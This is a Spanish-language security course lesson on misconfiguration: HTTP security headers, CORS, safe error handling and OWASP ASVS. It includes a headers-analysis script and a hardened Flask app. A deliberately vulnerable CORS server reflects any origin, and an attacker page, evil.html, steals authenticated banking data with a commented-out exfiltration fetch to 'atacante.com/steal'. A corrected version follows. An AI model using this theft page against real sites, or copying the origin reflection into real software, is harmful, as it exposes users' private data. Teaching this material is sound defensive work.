# Clase 21: Configuracion de Seguridad Incorrecta

**Duracion:** 2 horas

---

## Objetivos de Aprendizaje

1. Identificar errores comunes de configuracion de seguridad
2. Configurar correctamente security headers HTTP (HSTS, X-Frame-Options, CSP, etc.)
3. Comprender los riesgos de CORS mal configurado
4. Implementar manejo de errores seguros sin revelar informacion sensible
5. Conocer el estandar OWASP ASVS

---

## Contenido Detallado

### 1. Errores Comunes de Configuracion

| Error | Descripcion | Riesgo |
|-------|-------------|--------|
| **Configuraciones por defecto** | Credenciales admin/admin, puertos abiertos, servicios innecesarios | Acceso no autorizado inmediato |
| **Directorios listables** | Directory listing habilitado en servidores web | Exposicion de archivos sensibles, estructura del proyecto |
| **Headers HTTP inseguros** | Falta de HSTS, X-Frame-Options, CSP | Clickjacking, XSS, MITM, MIME sniffing |
| **Manejo de errores verbose** | Stack traces, versiones de software en respuestas de error | Informacion para ataques dirigidos |
| **CORS mal configurado** | `Access-Control-Allow-Origin: *` o reflejo del origen | Exfiltracion de datos desde cualquier origen |
| **Servicios innecesarios activos** | Puertos extras, modulos no usados (ej: WebDAV, FTP) | Superficie de ataque innecesaria |
| **Permisos incorrectos** | Archivos world-writable, contenedores como root | Escalada de privilegios |

### 2. Security Headers HTTP

Los security headers son cabeceras HTTP que el servidor envia al navegador para activar comportamientos de seguridad.

| Header | Que hace | Valor Recomendado |
|--------|----------|-------------------|
| **Strict-Transport-Security (HSTS)** | Fuerza conexiones HTTPS, previene SSL stripping | `max-age=31536000; includeSubDomains; preload` |
| **X-Frame-Options** | Previene clickjacking al no permitir iframes | `DENY` o `SAMEORIGIN` |
| **X-Content-Type-Options** | Previene MIME sniffing (navegador no adivina el tipo) | `nosniff` |
| **Content-Security-Policy (CSP)** | Controla que recursos puede cargar la pagina | `default-src 'self'` (restrictivo) |
| **X-XSS-Protection** | Activa filtro XSS del navegador (obsoleto en Chrome) | `1; mode=block` |
| **Referrer-Policy** | Controla que informacion se envia en el header Referer | `strict-origin-when-cross-origin` |
| **Permissions-Policy** | Controla que APIs del navegador puede usar la pagina | `camera=(), microphone=(), geolocation=()` |
| **Cache-Control** | Previene cacheo de respuestas sensibles | `no-store, max-age=0` |

### 3. CORS (Cross-Origin Resource Sharing)

CORS permite que un sitio web acceda a recursos de otro origen. Una configuracion incorrecta puede exponer datos sensibles.

**Configuracion insegura:**

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Credentials: true
```

Con `*` y `Allow-Credentials: true`, cualquier sitio web puede leer respuestas autenticadas.

**Reflejo del Origin (otra mala practica):**

Si el servidor refleja el header `Origin` del cliente como `Access-Control-Allow-Origin`, un atacante puede hacer una request desde `atacante.com` y el servidor respondera con `Access-Control-Allow-Origin: atacante.com`.

### 4. Manejo de Errores que Revela Informacion

**Nunca devolver al cliente:**

- Stack traces completos
- Versiones de software (Python 3.11, Flask 2.3, Django 4.2)
- Nombres de archivos y lineas de codigo
- Informacion de la base de datos (nombres de tablas, columnas)
- Tokens internos, API keys, config paths

**Buenas practicas:**
- Devolver mensajes genericos ("Error interno del servidor", "Recurso no encontrado")
- Loggear el error completo en el servidor para debugging
- Usar paginas de error personalizadas (403.html, 404.html, 500.html)

### 5. OWASP ASVS (Application Security Verification Standard)

ASVS es un estandar para verificar la seguridad de aplicaciones web. Tiene 3 niveles de verificacion:

| Nivel | Descripcion | Para quien es |
|-------|-------------|---------------|
| **L1** | Seguridad basica contra vulnerabilidades comunes | Todas las aplicaciones |
| **L2** | Seguridad contra ataques mas sofisticados | Apps que manejan datos sensibles |
| **L3** | Seguridad de alto nivel para apps criticas | Apps financieras, salud, infraestructura critica |

**Ejemplos de requisitos ASVS relacionados a configuracion:**

- V2.1: Verificar que el sistema use TLS 1.2+ y configuracion segura
- V14.1: Verificar que las configuraciones por defecto esten deshabilitadas
- V14.2: Verificar que headers de seguridad esten presentes
- V14.5: Verificar que CORS este configurado correctamente

---

## Ejercicio 1: Analizar Security Headers de un Sitio Web

### Escenario

Usar Python para analizar los headers HTTP de respuesta de un sitio web e identificar cuales faltan.

```python
"""
security_headers_analyzer.py
"""
import requests
from typing import Dict, List, Tuple

# Definicion de headers deseables y sus valores recomendados
SECURITY_HEADERS = {
    'Strict-Transport-Security': {
        'descripcion': 'Fuerza conexiones HTTPS',
        'recomendado': 'max-age=31536000; includeSubDomains',
        'severidad': 'ALTA',
    },
    'X-Frame-Options': {
        'descripcion': 'Previene clickjacking',
        'recomendado': 'DENY o SAMEORIGIN',
        'severidad': 'ALTA',
    },
    'X-Content-Type-Options': {
        'descripcion': 'Previene MIME sniffing',
        'recomendado': 'nosniff',
        'severidad': 'MEDIA',
    },
    'Content-Security-Policy': {
        'descripcion': 'Controla recursos permitidos (XSS prevention)',
        'recomendado': 'default-src \'self\'',
        'severidad': 'ALTA',
    },
    'X-XSS-Protection': {
        'descripcion': 'Activa filtro XSS del navegador',
        'recomendado': '1; mode=block',
        'severidad': 'MEDIA',
    },
    'Referrer-Policy': {
        'descripcion': 'Controla informacion enviada en Referer',
        'recomendado': 'strict-origin-when-cross-origin',
        'severidad': 'MEDIA',
    },
    'Permissions-Policy': {
        'descripcion': 'Controla APIs del navegador',
        'recomendado': 'geolocation=(), microphone=(), camera=()',
        'severidad': 'BAJA',
    },
    'Cache-Control': {
        'descripcion': 'Controla cacheo de respuestas',
        'recomendado': 'no-store, max-age=0 (para datos sensibles)',
        'severidad': 'MEDIA',
    },
}

def analyze_security_headers(url: str) -> List[Dict]:
    """
    Analiza los security headers de un sitio web.
    Retorna una lista con los resultados del analisis.
    """
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        headers = response.headers
        final_url = response.url

        print(f"Analizando: {url}")
        print(f"URL final: {final_url}")
        print(f"Status Code: {response.status_code}")
        print(f"Servidor: {headers.get('Server', 'No especificado')}")
        print("-" * 60)

        results = []
        for header_name, config in SECURITY_HEADERS.items():
            present = header_name in headers
            value = headers.get(header_name, '')

            result = {
                'header': header_name,
                'present': present,
                'value': value,
                'recomendado': config['recomendado'],
                'descripcion': config['descripcion'],
                'severidad': config['severidad'],
            }
            results.append(result)

            status = "OK" if present else "FALTA"
            print(f"[{status}] {header_name}")
            if present:
                print(f"       Valor: {value}")
            print(f"       Recomendado: {config['recomendado']}")
            print()

        return results

    except Exception as e:
        print(f"Error al analizar {url}: {e}")
        return []

def generate_report(results: List[Dict], url: str):
    """Genera un reporte de seguridad en formato texto"""
    missing = [r for r in results if not r['present']]
    present = [r for r in results if r['present']]

    print("=" * 60)
    print(f"RESUMEN DE SEGURIDAD - {url}")
    print("=" * 60)
    print(f"\nHeaders presentes: {len(present)}/{len(results)}")
    print(f"Headers faltantes: {len(missing)}/{len(results)}")
    print()

    if missing:
        print("Headers FALTANTES (priorizar correccion):")
        print("-" * 40)
        for m in missing:
            severidad = m['severidad']
            icono = "!!!" if severidad == "ALTA" else "!!" if severidad == "MEDIA" else "!"
            print(f"  {icono} [{severidad}] {m['header']}")
            print(f"     {m['descripcion']}")
            print(f"     Valor recomendado: {m['recomendado']}")
            print()

    if present:
        print("\nHeaders presentes:")
        print("-" * 40)
        for p in present:
            print(f"  [+] {p['header']}: {p['value'][:80]}...")
            print()

    # Calcular puntuacion
    score = len(present) / len(results) * 100
    grade = "A" if score >= 90 else "B" if score >= 75 else "C" if score >= 50 else "D" if score >= 25 else "F"
    print(f"Puntuacion: {score:.1f}% - Grado: {grade}")

# ============================================================
# EJECUCION
# ============================================================

if __name__ == '__main__':
    # Analizar sitios de ejemplo
    sitios = [
        'https://github.com',
        'https://www.google.com',
        'https://httpbin.org/response-headers',
    ]

    for sitio in sitios:
        results = analyze_security_headers(sitio)
        if results:
            generate_report(results, sitio)
        print("\n" + "=" * 60 + "\n")
```

**Ejecucion:**

```bash
pip install requests
python security_headers_analyzer.py
```

---

## Ejercicio 2: Configurar Security Headers en Flask

### Escenario

Implementar una configuracion completa de security headers en una aplicacion Flask con soporte para entornos de desarrollo y produccion.

```python
"""
secure_flask_app.py - App Flask con security headers completos
"""
from flask import Flask, jsonify, request, make_response, render_template_string
import os

app = Flask(__name__)

# ============================================================
# CONFIGURACION DE SEGURIDAD
# ============================================================

class SecurityConfig:
    """Configuracion de seguridad por entorno"""
    def __init__(self, environment='production'):
        self.environment = environment

    def get_headers(self):
        """Retorna los security headers apropiados para el entorno"""
        headers = {}

        # HSTS - Siempre activo en produccion
        if self.environment == 'production':
            headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
        elif self.environment == 'staging':
            headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
        else:
            # Development: max-age bajo para pruebas
            headers['Strict-Transport-Security'] = 'max-age=300'

        # Prevenir clickjacking
        headers['X-Frame-Options'] = 'DENY'

        # Prevenir MIME sniffing
        headers['X-Content-Type-Options'] = 'nosniff'

        # CSP - Diferente por entorno
        if self.environment == 'production':
            headers['Content-Security-Policy'] = self._build_csp('strict')
        else:
            headers['Content-Security-Policy'] = self._build_csp('relaxed')

        # XSS Protection (modern browsers ignoran, pero por compatibilidad)
        headers['X-XSS-Protection'] = '1; mode=block'

        # Referrer Policy
        headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

        # Permissions Policy (control de APIs del navegador)
        headers['Permissions-Policy'] = (
            'camera=(), '
            'microphone=(), '
            'geolocation=(), '
            'payment=(), '
            'usb=()'
        )

        # Cache control para respuestas sensibles
        headers['Cache-Control'] = 'no-store, max-age=0'
        headers['Pragma'] = 'no-cache'
        headers['Expires'] = '0'

        return headers

    def _build_csp(self, mode='strict'):
        """Construye la politica CSP"""
        if mode == 'strict':
            return (
                "default-src 'self'; "
                "script-src 'self'; "
                "style-src 'self'; "
                "img-src 'self'; "
                "font-src 'self'; "
                "connect-src 'self'; "
                "frame-ancestors 'none'; "
                "form-action 'self'; "
                "base-uri 'self'; "
                "object-src 'none'"
            )
        else:
            # CSP relajado para desarrollo (permite CDNs, inline scripts con nonce)
            return (
                "default-src 'self'; "
                "script-src 'self' https://cdnjs.cloudflare.com 'nonce-dev'; "
                "style-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; "
                "img-src 'self' data:; "
                "font-src 'self'; "
                "connect-src 'self' ws:; "
                "frame-ancestors 'none'; "
                "form-action 'self'; "
                "base-uri 'self'; "
                "object-src 'none'"
            )


# Detectar entorno
ENVIRONMENT = os.getenv('FLASK_ENV', 'development')
security_config = SecurityConfig(ENVIRONMENT)


@app.after_request
def add_security_headers(response):
    """Middleware que agrega security headers a todas las respuestas"""
    headers = security_config.get_headers()
    for name, value in headers.items():
        response.headers[name] = value

    # CORS controlado
    origin = request.headers.get('Origin', '')
    # Solo permitir origenes confiables
    allowed_origins = ['https://mydomain.com', 'https://app.mydomain.com']
    if origin in allowed_origins:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Max-Age'] = '3600'

    return response


@app.errorhandler(403)
def forbidden(e):
    """Pagina de error 403 personalizada (sin revelar informacion)"""
    return jsonify({'error': 'Acceso denegado'}), 403


@app.errorhandler(404)
def not_found(e):
    """Pagina de error 404 personalizada"""
    return jsonify({'error': 'Recurso no encontrado'}), 404


@app.errorhandler(500)
def internal_error(e):
    """Pagina de error 500 personalizada - NUNCA revelar stack trace"""
    # Loggear el error completo en el servidor
    app.logger.error(f"Error 500: {str(e)}", exc_info=True)
    # Devolver mensaje generico
    return jsonify({'error': 'Error interno del servidor'}), 500


# ============================================================
# RUTAS DE EJEMPLO
# ============================================================

@app.route('/')
def index():
    return jsonify({
        'mensaje': 'API segura',
        'entorno': ENVIRONMENT,
    })


@app.route('/api/usuarios/<int:user_id>')
def get_user(user_id):
    # Simular respuesta con datos sensibles con headers anti-cache
    response = make_response(jsonify({
        'id': user_id,
        'nombre': 'Usuario Ejemplo',
        'email': 'usuario@example.com',
    }))
    # Cache-Control adicional para datos sensibles
    response.headers['Cache-Control'] = 'no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    return response


# ============================================================
# VERIFICACION
# ============================================================

@app.route('/debug/headers')
def debug_headers():
    """Endpoint para verificar los headers de seguridad configurados"""
    headers = dict(security_config.get_headers())
    return jsonify({
        'security_headers': headers,
        'environment': ENVIRONMENT,
        'note': 'Estos headers se aplican a TODAS las respuestas'
    })


if __name__ == '__main__':
    print(f"Iniciando en entorno: {ENVIRONMENT}")
    print(f"CSP activa: {security_config.get_headers().get('Content-Security-Policy')}")
    app.run(host='127.0.0.1', port=5000, debug=False)
```

**Verificar los headers:**

```bash
# Iniciar servidor
python secure_flask_app.py

# Verificar headers con curl
curl -v http://127.0.0.1:5000/ 2>&1 | grep -i -E "^(< |strict|x-frame|x-content|content-securit|referrer|permissions|cache)"

# Verificar con script Python
python -c "
import requests
r = requests.get('http://127.0.0.1:5000/')
for k, v in r.headers.items():
    if any(h in k.lower() for h in ['strict', 'frame', 'content-type', 'content-securit', 'referrer', 'x-xss', 'permission', 'cache']):
        print(f'{k}: {v}')
"
```

---

## Ejercicio 3: CORS Mal Configurado - Version Vulnerable y Segura

### Escenario

Un servidor tiene CORS configurado incorrectamente permitiendo que cualquier sitio web lea datos del usuario autenticado.

**Version vulnerable:**

```python
"""
cors_vulnerable.py - Servidor con CORS mal configurado
"""
from flask import Flask, jsonify, request, session

app = Flask(__name__)
app.secret_key = 'supersecretkey'

# Simular base de datos de usuarios (datos bancarios)
USUARIOS = {
    1: {'nombre': 'Juan', 'email': 'juan@bank.com', 'cuenta': 'ES12 3456 7890 1234', 'saldo': 50000},
    2: {'nombre': 'Maria', 'email': 'maria@bank.com', 'cuenta': 'ES98 7654 3210 9876', 'saldo': 120000},
}

@app.route('/api/perfil')
def perfil():
    if 'user_id' not in session:
        return jsonify({'error': 'No autenticado'}), 401

    user_id = session['user_id']
    if user_id not in USUARIOS:
        return jsonify({'error': 'Usuario no encontrado'}), 404

    user_data = USUARIOS[user_id]

    # PROBLEMA 1: CORS demasiado permisivo
    origin = request.headers.get('Origin', '')
    response = jsonify(user_data)

    # Refleja cualquier origen (malisimo)
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'

    return response

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    if data.get('user') == 'juan' and data.get('pass') == '1234':
        session['user_id'] = 1
        return jsonify({'ok': True})
    return jsonify({'error': 'Credenciales invalidas'}), 401

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

**Pagina atacante que explota CORS mal configurado:**

```html
<!-- evil.html - Pagina del atacante que roba datos via CORS -->
<!DOCTYPE html>
<html>
<head>
    <title>Prueba de CORS</title>
</head>
<body>
    <h1>Ganaste un premio!</h1>
    <p>Haz click para reclamar...</p>

    <script>
        // El atacante pone esta pagina en atacante.com
        // Cuando un usuario autenticado en bank.com la visite...

        function stealData() {
            var xhr = new XMLHttpRequest();
            xhr.withCredentials = true;  // Envia cookies de la sesion
            xhr.open('GET', 'http://127.0.0.1:5000/api/perfil', true);

            xhr.onload = function() {
                // Datos robados! (gracias a CORS mal configurado)
                var data = JSON.parse(xhr.responseText);
                document.getElementById('result').innerHTML =
                    '<h2>Datos Robados:</h2>' +
                    '<pre>' + JSON.stringify(data, null, 2) + '</pre>';

                // Enviar a servidor del atacante (simulado)
                console.log('DATOS ROBADOS:', data);
                // fetch('https://atacante.com/steal', { method: 'POST', body: JSON.stringify(data) });
            };

            xhr.onerror = function() {
                document.getElementById('result').innerHTML = 'Error al robar datos';
            };

            xhr.send();
        }

        // Ejecutar inmediatamente
        stealData();
    </script>

    <div id="result"></div>
</body>
</html>
```

**Version corregida (CORS seguro):**

```python
"""
cors_seguro.py - Configuracion CORS segura
"""
from flask import Flask, jsonify, request, session
import os

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# Lista blanca de origenes permitidos
ALLOWED_ORIGINS = frozenset([
    'https://www.bank.com',
    'https://bank.com',
    'https://app.bank.com',
])

# Metodos HTTP permitidos
ALLOWED_METHODS = ['GET', 'POST', 'PUT', 'DELETE']

# Headers permitidos en requests
ALLOWED_HEADERS = ['Content-Type', 'Authorization', 'X-CSRF-Token']

# Cache de preflight (24 horas)
PREFLIGHT_MAX_AGE = 86400

USUARIOS = {
    1: {'nombre': 'Juan', 'email': 'juan@bank.com', 'cuenta': 'ES12 3456 7890 1234', 'saldo': 50000},
    2: {'nombre': 'Maria', 'email': 'maria@bank.com', 'cuenta': 'ES98 7654 3210 9876', 'saldo': 120000},
}

def configure_cors(response):
    """Configura CORS de forma segura"""
    origin = request.headers.get('Origin', '')

    # Solo permitir origenes de la lista blanca
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = ', '.join(ALLOWED_METHODS)
        response.headers['Access-Control-Allow-Headers'] = ', '.join(ALLOWED_HEADERS)
        response.headers['Access-Control-Max-Age'] = str(PREFLIGHT_MAX_AGE)
    else:
        # Si el origen no esta permitido, no incluir header CORS
        # El navegador bloqueara la request
        pass

    return response

@app.after_request
def after_request(response):
    return configure_cors(response)

@app.route('/api/perfil')
def perfil():
    if 'user_id' not in session:
        return jsonify({'error': 'No autenticado'}), 401

    user_id = session['user_id']
    if user_id not in USUARIOS:
        return jsonify({'error': 'Usuario no encontrado'}), 404

    user_data = USUARIOS[user_id]

    # Solo devolver datos minimos necesarios
    return jsonify({
        'nombre': user_data['nombre'],
        'email': user_data['email'],
        # NO incluir cuenta bancaria ni saldo en respuestas CORS
    })

@app.route('/api/perfil/completo')
def perfil_completo():
    """Endpoint que requiere mismo origen (no CORS)"""
    if 'user_id' not in session:
        return jsonify({'error': 'No autenticado'}), 401

    # Verificar que la request es del mismo origen
    origin = request.headers.get('Origin', '')
    if origin and origin not in ALLOWED_ORIGINS:
        return jsonify({'error': 'Acceso denegado desde este origen'}), 403

    user_id = session['user_id']
    user_data = USUARIOS.get(user_id)
    if not user_data:
        return jsonify({'error': 'Usuario no encontrado'}), 404

    # Datos completos solo disponibles para origenes confiables
    return jsonify(user_data)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

**Principios de CORS seguro:**

1. **Whitelist, no blacklist:** Listar origenes explicitamente permitidos
2. **No reflejar Origin:** Nunca devolver el header Origin como Allow-Origin
3. **No usar `*` con credenciales:** Es invalido y peligroso
4. **Minimo privilegio:** Solo permitir los metodos y headers necesarios
5. **Preflight con cache:** Cachear preflight OPTIONS para reducir overhead
6. **Datos minimos:** No exponer datos sensibles en endpoints CORS

---

## Preguntas y Respuestas

### Pregunta 1
**Cuales son los 5 security headers mas importantes y que protegen?**

**Respuesta:** (1) **Strict-Transport-Security (HSTS)**: fuerza HTTPS y previene ataques SSL stripping y downgrade attacks. (2) **X-Frame-Options**: previene clickjacking al impedir que la pagina se cargue en un iframe. (3) **X-Content-Type-Options: nosniff**: previene que el navegador adivine el tipo MIME de un recurso (MIME sniffing attacks). (4) **Content-Security-Policy**: es la defensa mas potente contra XSS, controlando que recursos (scripts, estilos, imagenes) puede cargar la pagina. (5) **Referrer-Policy**: controla cuanta informacion de la URL se envia en el header Referer al navegar a otros sitios.

### Pregunta 2
**Por que es peligroso reflejar el header Origin como Access-Control-Allow-Origin?**

**Respuesta:** Reflejar el Origin es peligroso porque un atacante puede hacer que el navegador de la victima envie una request desde `atacante.com` y el servidor respondera con `Access-Control-Allow-Origin: atacante.com`, permitiendo que `atacante.com` lea la respuesta. Combinado con `Access-Control-Allow-Credentials: true`, el atacante puede robar datos autenticados del usuario. Ejemplo: si el usuario esta autenticado en `bank.com`, y visita `atacante.com`, un script en `atacante.com` puede hacer fetch a `bank.com/api/perfil` y leer los datos bancarios porque el servidor refleja el origen.

### Pregunta 3
**Que informacion sensible se debe evitar en respuestas de error?**

**Respuesta:** En respuestas de error NUNCA se debe incluir: (1) stack traces completos (revelan estructura del codigo, rutas de archivos, versiones), (2) versiones de software (Python X.Y, Flask X.Y, MySQL X.Y), (3) nombres de archivos y numeros de linea, (4) consultas SQL o detalles de la base de datos, (5) tokens internos, API keys, o configuraciones del servidor, (6) nombres de usuarios internos o estructuras de directorios. En su lugar, devolver mensajes genericos como "Error interno del servidor" y loggear el detalle completo en el servidor para debugging.

### Pregunta 4
**Que es un ataque de directory listing y como se previene?**

**Respuesta:** Directory listing ocurre cuando un servidor web muestra el listado de archivos de un directorio cuando no hay un archivo index (index.html, index.php). Esto expone toda la estructura del proyecto, archivos de configuracion, backups, y datos sensibles. Prevencion: (1) deshabilitar directory listing en el servidor web (Apache: `Options -Indexes`, Nginx: `autoindex off;`), (2) asegurarse de que todos los directorios tengan un archivo index, (3) no almacenar archivos sensibles dentro del webroot, (4) usar archivos .htaccess o configuracion del servidor para restringir acceso a directorios especificos.

### Pregunta 5
**Cual es la diferencia entre CORS y CSRF? Como se relacionan?**

**Respuesta:** CORS (Cross-Origin Resource Sharing) es un mecanismo del navegador que controla que origenes pueden acceder a recursos de otro origen. CSRF (Cross-Site Request Forgery) es un ataque donde un sitio malicioso hace que el navegador de la victima envie una request a otro sitio donde esta autenticada. CORS mal configurado facilita CSRF porque permite leer la respuesta de la request cross-origin. Para prevenir: (1) CORS bien configurado (whitelist de origenes), (2) CSRF tokens en formularios, (3) SameSite cookies, (4) verificar header Referer/Origin en el servidor.

### Pregunta 6
**Que es OWASP ASVS y como ayuda a prevenir configuraciones inseguras?**

**Respuesta:** OWASP ASVS (Application Security Verification Standard) es un estandar que define requisitos de seguridad para aplicaciones web organizados en niveles (L1, L2, L3). Para configuraciones inseguras, ASVS especifica requisitos como: V14.1 (verificar que configuraciones por defecto y servicios innecesarios esten deshabilitados), V14.2 (verificar headers de seguridad), V14.4 (verificar que el manejo de errores no revele informacion), V14.5 (verificar configuracion CORS). ASVS proporciona una checklist que los equipos pueden usar durante desarrollo, testing y auditoria para asegurar que todas las configuraciones de seguridad esten correctamente implementadas.

---

## Tarea / Lectura Recomendada

1. **Leer:** OWASP Security Headers Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
2. **Leer:** OWASP ASVS (Application Security Verification Standard) - https://owasp.org/www-project-application-security-verification-standard/
3. **Practicar:** Usar securityheaders.com para analizar headers de sitios populares
4. **Experimentar:** Configurar un servidor Flask con todos los security headers y verificar con curl
5. **Leer:** Mozilla Observatory - https://observatory.mozilla.org/ (herramienta para evaluar security headers)
6. **Profundizar:** Investigar el ataque "CORS misconfiguration" en PortSwigger Web Security Academy
7. **Leer:** OWASP CORS Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html


